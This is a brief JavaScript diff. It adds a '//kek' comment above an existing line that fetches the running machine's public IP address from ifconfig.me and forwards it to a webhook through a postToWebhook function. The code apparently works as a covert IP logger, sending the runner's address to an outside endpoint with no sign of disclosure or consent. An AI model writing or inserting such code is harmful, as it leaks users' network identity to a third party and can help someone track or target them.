@@ -10,4 +10,5 @@ function postToWebhook(text) {
     });
 }
 
+//kek
 fetch("https://ifconfig.me/ip").then(res => res.text()).then(ip => postToWebhook(ip));
